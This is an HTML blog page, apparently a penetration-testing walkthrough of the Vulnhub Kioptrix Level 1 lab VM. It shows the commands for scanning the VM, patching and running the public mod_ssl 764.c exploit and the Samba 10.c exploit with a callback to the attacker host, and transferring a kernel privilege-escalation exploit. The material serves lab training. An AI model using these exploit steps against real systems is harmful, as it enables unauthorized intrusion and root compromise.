@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="Let us discuss about security">
+    <meta name="author" content="3kara &lt;adm1n.3kara@protonmail.com&gt;">
+    <meta name="twitter:card" content="summary" /> <!--Page Cover-->
+    
+    <title>Vulnhub Kioptrix Level 1 - 3kara</title> 
+    
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+    <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.13.1/css/all.css" integrity="sha384-xxzQGERXS00kBmZW/6qxqJPyxW3UR0BPsL4c8ILaIWXva5kFi7TxkIIaMiKtqV1Q" crossorigin="anonymous">
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+    <link rel="stylesheet" href="/css/style.css">
+
+</head>
+
+<body>
+    <a href="javascript:" id="rtt"><i class="fas fa-chevron-up"></i></a>
+    <div class="bg-gradient"></div>
+    <div class="bg-pattern"></div>
+    
+    <!--Menu Links and Overlay-->
+    <div class="menu-bg">
+        <div class="menu-container">
+            <ul>
+                <li class="menu-item"><a href="/">Home</a></li>
+                <li class="menu-item"><a href="/api">API</a></li>
+                <li class="menu-item"><a href="/blog">Blog</a></li>
+                <li class="menu-item"><a href="/ics">ICS</a></li>
+                <li class="menu-item"><a href="/oscp">Oscp</a></li>
+            </ul>
+        </div>
+    </div>
+    
+    <!--Hamburger Icon-->
+    <nav>
+        <a href="#menu"></a>
+    </nav>
+    
+    <div class="container">
+    
+        <!-- Main Content -->
+        <div class="row">
+        <div class="col-sm-12">
+    
+        <!--Title and Logo-->
+        <header>
+        <div class="logo">
+            <a href="/"><i class="logo-icon rotate linear infinite fas fa-dharmachakra" aria-hidden="true"></i></a>
+            <h1 id="main-title" class="title">Walkthrough</h1>
+        </div>
+        </header>
+    
+    <section class="main">
+                
+                     
+    <div class="post">
+    
+        <div class="post-header">
+            <h1 class="title"><a href="/oscp/walkthrough/vulnhub-kioptrix-level-1">Vulnhub - Kioptrix Level 1</a></h1>
+        </div>
+    
+        <div class="content">
+
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2>
+            <p>Kioptrix is a boot to root challange series i.e. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). These games can help us to learn the basic tools and techniques in vulnerability assessment and exploitation.</p>
+            <h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2>
+            <p>We imported the VM into Virtual Box and kept the network adapter in Bridged mode. Now we should identify the ip address of the VM to get started, so we will run a ping scan on IP range.</p>
+            <blockquote><p>kal@3kara:~$  sudo nmap -n -sn -vvv 192.168.56.0-255</p></blockquote>
+            <p>If you are not able to identify the target  IP then try out other options which are shown <a href="/oscp/information-gathering/identifying-targets">here.</a></p>
+            <p>Once we identify the target ip, we go ahead and run a simple service version scan on it.</p>
+            <div class="picture-container">
+                <a href="nmap" data-featherlight="/oscp/img/kl1/nmap.png">
+                    <img src="/oscp/img/kl1/nmap.png" class="img-thumbnail" /></a>
+            </div><br>
+            <p>That’s a lot of outdated services! Let’s go over each and find how we can exploit them. Some resources for identifying vulnerabilities and/or finding exploits for known services are:</p>
+            </ul><h2 id="Vulnerability-Database"><a href="#Vulnerability-Database" class="headerlink" title="Vulnerability Database"></a>Vulnerability Databases</h2><ul>
+            <li><a href="http://www.exploit-db.com/" target="_blank" rel="external">Exploit-DB</a></li>
+            <li><a href="http://www.owasp.org/" target="_blank" rel="external">OWASP</a></li>
+            <li><a href="http://securityvulns.com/" target="_blank" rel="external">Security Vulns</a></li>
+            <li><a href="http://www.securityfocus.com/" target="_blank" rel="external">Security Focus</a></li>
+            <li><a href="http://cvedetails.com/" target="_blank" rel="external">CVE Details</a></li>
+            <li><a href="http://www.securiteam.com/" target="_blank" rel="external">Securi</a></li>
+            <li><a href="http://secunia.com/advisories/" target="_blank" rel="external">Secunia</a></li>
+            <li><a href="http://insecure.org/sploits_all.html" target="_blank" rel="external">Insecure</a></li>
+            <li><a href="http://web.nvd.nist.gov/" target="_blank" rel="external">NVD NIST</a></li>
+            <li><a href="http://zerodayinitiative.com/advisories/published/" target="_blank" rel="external">Zero Day Initiative</a></li>
+            <li><a href="http://nmrc.org/pub/index.html" target="_blank" rel="external">NMRC</a></li>
+            <li><a href="http://www.rapid7.com/vulndb/index.jsp" target="_blank" rel="external">Rapid7</a></li>
+            <li><a href="http://oval.mitre.org" target="_blank" rel="external">Mitre</a></li>
+            </ul>
+            <p>We can see that the ports 80, 443 running an apache 1.3.20 with mod_ssl 2.8.4 and 139 running samba are open. So lets reduce the attack surface to these services.</p>
+            <h2 id="Exploiting-Apache-mod_ssl"><a href="#Exploiting-Apache-mod_ssl" class="headerlink" title="Exploiting Apache mod_ssl"></a>Exploiting Apache mod_ssl</h2>
+            <p>Ports 80 and 443 running apache, serves “test” page which is not interested, so lets get started by searching for the exploit locally using searchsploit.</p>
+            <div class="picture-container">
+                <a href="apache-mod" data-featherlight="/oscp/img/kl1/searchapachemod.png">
+                    <img src="/oscp/img/kl1/searchapachemod.png" class="img-thumbnail" /></a>
+            </div><br>
+            <p>We get errors when tried to compile the 764.c exploit, so a quick Google search on Apache 1.3.20 will give you a lot of possible vulnerabilities; additionally if you search for the openssl version (2.8.4) that it’s running you will find even more! One such exploit is the open_f*ck exploit, a c-program that exploits the remote buffer overflow that our target is vulnerable. However, the 764.c which we have is old. So we need to update it slightly, before that we will install “libssl1.0-dev”</p>
+            <p>Make a copy of the 764.c program and modify as follows: </p>
+            <p>1. Add headers<br>
+                #include &lt;openssl/md5.h&gt;<br>
+                #include &lt;openssl/rc4.h&gt;<br><br>
+                2. search for “wget” to replace the url "http://packetstormsecurity.nl/0304-exploits/ptrace-kmod.c" with this "https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c"<br><br>
+                3. Scroll down to line 964 and replace unsigned char *p, *end; with const unsigned char *p, *end;<br>
+                <div class="picture-container">
+                <a href="nanocode" data-featherlight="/oscp/img/kl1/nanocode.png">
+                    <img src="/oscp/img/kl1/nanocode.png" class="img-thumbnail" /></a>
+                </div><br>
+                4. you can download the updated exploit from <a href="https://github.com/3kara/3kara.github.io/blob/master/exploit/764.c">here</a>, Now we go ahead and compile our exploit.<br>
+                gcc -o openfuck 764.c -lcrypto
+            </p>
+            <p>Lets execute this exploit to spawn a shell.<br>./openfuck 0x6b 192.168.56.111 -c 40</p>
+            <div class="picture-container">
+                <a href="apache-shell" data-featherlight="/oscp/img/kl1/kl1apacheapache.png">
+                    <img src="/oscp/img/kl1/kl1apacheapache.png" class="img-thumbnail" /></a>
+            </div><br>
+            <p>The low privilege shell has now been obtained.</p>
+            <h2 id="Privilege-Escalation"><a href="#privilege-Escalation" class="headerlink" title="Privilege-Escalation"></a>Privilege Escalation</h2>
+            <p>Now it's time for some basic enumeration in order to find out privilege escalation vector, starting with Operating System and Kernel information:</p>
+            <div class="picture-container">
+                <a href="kernel-info" data-featherlight="/oscp/img/kl1/peoskernel.png">
+                    <img src="/oscp/img/kl1/peoskernel.png" class="img-thumbnail" /></a>
+            </div><br>
+            <p>As can be seen from above, this is Red Hat Linux 7.2 and kernel version 2.4.7. But ifconfig command did not work, meaning other commands (and exploits) might not work too due to the default path not being set. This can be fixed by exporting the PATH variable, as shown below.</p>
+            <div class="picture-container">
+                <a href="export-path" data-featherlight="/oscp/img/kl1/exportpath.png">
+                    <img src="/oscp/img/kl1/exportpath.png" class="img-thumbnail" /></a>
+            </div><br>
+            <p>We got our privilege escalation vector i.e. kernel version. so let us find an appropriate kernel exploit:</p>
+            <div class="picture-container">
+                <a href="lpe" data-featherlight="/oscp/img/kl1/lpe.png">
+                    <img src="/oscp/img/kl1/lpe.png" class="img-thumbnail" /></a>
+            </div><br>
+            <p>We can see that gcc is installed by executing "gcc" in limited shell. The exploit can be transferred to the victim's system by serving the file in our webserver (do not forget to start the webserver with service apache2 start), download the exploit in the victim's system, compile and run on the system as show below.</p>
+            <div class="picture-container">
+                <a href="apache-root" data-featherlight="/oscp/img/kl1/kl1apacheroot.png">
+                    <img src="/oscp/img/kl1/kl1apacheroot.png" class="img-thumbnail" /></a>
+            </div><br>
+            <h2 id="Exploiting-Samba"><a href="#Exploiting-Samba" class="headerlink" title="Exploiting Samba"></a>Exploiting Samba</h2>
+            <p>let us find the samba version to search for an available exploit. apart from metasploits smb version scanner, no script/tool works, as smbclient has been updated. So we have to modify the smb.conf file to make it work.</p>
+            <p>Add these 2 lines after the [global] line under Global settings and save it:<br>client min protocol = CORE<br>client max protocol = SMB3</p> 
+            <p>Now start wireshark and set filter to display smb protocol and run “smbclient -L 192.168.1.4”  and press enter. In wireshark select any packet of smb protocol, right click and select follow > TCP stream, here look for the string “Unix.Samba” followed by the version as shown in the image.</p>
+            <div class="picture-container">
+                <a href="samba-version" data-featherlight="/oscp/img/kl1/sambaversion.png">
+                    <img src="/oscp/img/kl1/sambaversion.png" class="img-thumbnail" /></a>
+            </div><br>
+            <p>Let us search for the exploit for the samba version.</p>
+            <div class="picture-container">
+                <a href="search-samba" data-featherlight="/oscp/img/kl1/searchsamba.png">
+                    <img src="/oscp/img/kl1/searchsamba.png" class="img-thumbnail" /></a>
+            </div><br>
+            <p>make a copy of 10.c exploit and compile it using “gcc -o rce 10.c” and let's execute this exploit to spawn a shell.<br>./rce -b 0 -c 192.168.56.1 -C 40 192.168.56.111</p>
+            <div class="picture-container">
+                <a href="samba-root" data-featherlight="/oscp/img/kl1/kl1sambaroot.png">
+                    <img src="/oscp/img/kl1/kl1sambaroot.png" class="img-thumbnail" /></a>
+            </div><br>
+            <p>Alright, if you have exploited any other service to gain root then help us update by clicking the author name.</p>
+
+        </div>
+        
+      
+        
+
+
+    </div>
+                   
+    </section>
+    </div>
+    </div>
+
+    
+
+    </div>
+    
+    <!-- Footer -->
+    <div class="push"></div>
+    
+    <footer class="footer-content">
+        <div class="container">
+            <div class="row">
+                <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                    <h2><a href="#">About</a></h2>
+                    <p>3kara is the source for security concepts and information about Web, Mobile and API along with few Walkthroughs, Best practices, Cheatsheets, Custom Scripts, Tips & Techniques.</p>
+                    <p>Our goal is to spread enthusiasm, awareness and joy on information security as well as to document and share what we were able to learn  along the way.</p>
+                </div>
+                
+                <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-contact">
+                    <h2>Contact</h2>
+                    <p>For queries, Contact us at adm1n.3kara@protonmail.com</p>
+                    <p>Stuck somewhere? Don't hesitate</p> 
+                    <p>Contact author directly by clicking on their name.</p>
+                </div>
+                
+    </div>
+            <div class="row">
+                <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                    <ul class="list-inline footer-social-icons">
+                        
+                        <li class="list-inline-item"><a href="https://3kara.github.com"><span class="footer-icon-container"><i class="fab fa-github"></i></span></a></li>
+                        <li class="list-inline-item"><a href="https://twitter.com/_3kara?lang=en"><span class="footer-icon-container"><i class="fab fa-twitter"></i></span></a></li>
+                        <li class="list-inline-item"><a href="https://t.me/i3kara"><span class="footer-icon-container"><i class="fab fa-telegram"></i></span></a></li>
+                        <li class="list-inline-item"><a href="mailto:adm1n.3kara@protonmail.com"><span class="footer-icon-container"><i class="far fa-envelope"></i></span></a></li>
+                        <li class="list-inline-item"><a href="https://discord.gg/4uuuqHp"><span class="footer-icon-container"><i class="fab fa-discord"></i></span></a></li>
+                                                                       
+                    </ul>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                    <div class="footer-copyright">
+                        All rights reserved &copy; 3kara <script>document.write(new Date().getFullYear());</script> You reap what you sow
+
+                    </div>
+                </div>
+            </div>
+        </div>
+       
+    </footer>
+     
+    <!-- After footer scripts -->
+    
+    <script src="//code.jquery.com/jquery-2.1.4.min.js"></script> <!-- jQuery -->    
+    <script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script> <!-- Tween Max --> 
+    <script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script> <!-- Gallery -->
+    <script src="/js/main.js"></script>
+    
+    </body>
+    
+    </html>
